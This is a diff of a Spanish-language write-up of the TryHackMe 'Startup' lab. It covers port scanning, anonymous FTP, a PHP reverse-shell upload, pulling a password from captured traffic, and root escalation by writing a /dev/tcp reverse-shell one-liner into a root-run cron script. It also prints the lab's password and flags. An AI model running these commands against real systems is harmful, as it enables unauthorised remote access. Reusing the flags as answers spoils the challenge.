@@ -2,122 +2,124 @@
 
 ## Escaneo de puertos
 
-Usamos la herramienta de`nmap`para mapear los puertos abiertos disponibles en la máquina víctima.
+Usamos la herramienta de `nmap` para mapear los puertos abiertos disponibles en la máquina víctima:
 
-```
+```bash
 sudo nmap -sV -T4 -p- 10.10.32.165
 ```
 
 Tenemos tres puertos abiertos.
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image.png)
+![](images/image.png)
 
 ## Acceso por FTP
 
-Entramos mediante FTP de forma anónima.
+Entramos mediante FTP de forma anónima:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-1.png)
+![](images/image-1.png)
 
-Nos descargamos los ficheros que hay disponibles.
+Nos descargamos los ficheros disponibles:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-2.png)
+![](images/image-2.png)
 
-La imagen no parece nada relevante de momento.
+La imagen no parece relevante de momento:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-3.png)
+![](images/image-3.png)
 
-Aunque tenemos un posible usuario en el sistema:`Maya`.
+Aunque hay un posible usuario en el sistema: `Maya`.
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-4.png)
+![](images/image-4.png)
 
 ## Inspeccionando el servidor web
 
-Accedemos al sitio web para ver si hay algo importante.
+Accedemos al sitio web:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-5.png)
+![](images/image-5.png)
 
-Usamos`gobuster`para identificar posibles directorios ocultos.
+Usamos `gobuster` para identificar posibles directorios ocultos:
 
+```bash
+gobuster dir -u http://10.10.32.165 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
-gobuster dir -u 10.10.32.165 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-```
 
-Encontramos un directorio llamado`/files`.
+Encontramos un directorio llamado `/files`:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-6.png)
+![](images/image-6.png)
 
-Accedemos al mismo y vemos que tiene el mismo contenido que vimos por FTP.
+Accedemos al mismo y vemos el mismo contenido que en FTP:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-7.png)
+![](images/image-7.png)
 
 ## Reverse Shell
 
-Podemos implantar una reserve shell ya que es un directorio abierto vulnerable.
+Podemos implantar una reverse shell en este directorio abierto:
 
-https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+![](images/image-8.png)
 
-Ponemos nuestra IP y el puerto y guardamos.
+Abrimos el puerto en escucha:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-8.png)
-
-Abrimos el puerto en escucha.
-
-```
+```bash
 nc -lvnp 1234
 ```
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-9.png)
+![](images/image-9.png)
 
-Subimos el archivo de la reverse shell a través de ftp.
+Subimos el archivo de la reverse shell vía FTP:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-10.png)
+![](images/image-10.png)
 
-Volvemos a la página y en la carpeta de ftp tenemos el archivo subido.
+Volvemos a la web y en `/files` aparece el archivo:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-11.png)
+![](images/image-11.png)
 
-Simplemente hacemos clic y se quedará cargando y hemos obtenido acceso.
+Hacemos clic y se ejecuta, obteniendo acceso:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-12.png)
+![](images/image-12.png)
 
-Obtenemos un shell mas estable escribiendo`bash -i`.
+Obtenemos shell más estable:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-13.png)
+```bash
+bash -i
+```
 
-Inspeccionando el contenido encontramos el fichero que necesitábamos de`recipe.txt`.
+![](images/image-13.png)
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-14.png)
+Inspeccionamos y encontramos `recipe.txt`:
 
-El ingredientes es`love`.
+![](images/image-14.png)
 
-Vamos a la carpeta de`incidents`y tenemos un fichero de Wireshark.
+El ingrediente es `love`.
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-15.png)
+## Análisis de tráfico
 
-Lo descargamos copiandolo a la carpeta expuesta en el sitio web.
+Vamos a la carpeta `incidents` y vemos un fichero de Wireshark:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-16.png)
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-17.png)
+![](images/image-15.png)
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-18.png)
+Lo descargamos copiándolo a la carpeta accesible en la web:
 
-Seleccionamos cualquier paquete TCP y le damos a "Follow" y luego "TCP Stream".
+![](images/image-16.png)
+![](images/image-17.png)
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-19.png)
+![](images/image-18.png)
 
-Encontramos la contraseña de un usuario llamado`lennie` que es`c4ntg3t3n0ughsp1c3`.
+Seleccionamos cualquier paquete TCP y seguimos el flujo:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-20.png)
+![](images/image-19.png)
+
+Encontramos contraseña de `lennie`: `c4ntg3t3n0ughsp1c3`.
+
+![](images/image-20.png)
 
 ## Acceso por SSH
 
-Usando estas credenciales, accedemos con el usuario`lennie`.
+Usamos credenciales de `lennie` para SSH:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-21.png)
+![](images/image-21.png)
 
-Obtenemos la flag del`user.txt`.
+Leemos `user.txt`:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-22.png)
+![](images/image-22.png)
 
 ```
 THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
@@ -125,41 +127,28 @@ THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
 
 ## Escalada de privilegios
 
-En la carpeta`/scripts`hay más archivos importantes. El de`planner.sh`vemos que el propietario es root
+En `/scripts` hay archivos importantes. `planner.sh` es propiedad de root y ejecuta `/etc/print.sh`:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-23.png)
+![](images/image-23.png)
+![](images/image-24.png)
 
-Y ejecuta`/etc/print.sh`.
+Subimos `pspy64` a través de FTP para vigilar procesos root:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-24.png)
+![](images/image-25.png)
 
-Usamos`pspy`para comprobar los procesos que hay funcionando del usuario root.
+Insertamos reverse shell en `/etc/print.sh`:
 
-https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
-
-Subimos el programa a través de FTP.
-
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-25.png)
-
-Esto es necesario porque no podemos usar`wget`desde el login de SSH.
-
-Generamos una reverse shell para el root.
-
-https://www.revshells.com/
-
-Insertamos el payload en el script que se ejecuta cada minuto al parecer.
-
-```
+```bash
 echo "sh -i >& /dev/tcp/10.2.41.173/5555 0>&1" > /etc/print.sh
 ```
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-26.png)
+![](images/image-26.png)
 
-Abrimos otro puerto en escucha y cuando se ejecute el script, tenemos acceso como root ya que el script como ya sabemos se ejecuta con permisos de administrador.
+Cuando se ejecute el script, obtendremos shell root:
 
-![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-27.png)
+![](images/image-27.png)
 
-Tenemos la flag de`root.txt`.
+Leemos `root.txt`:
 
 ```
 THM{f963aaa6a430f210222158ae15c3d76d}
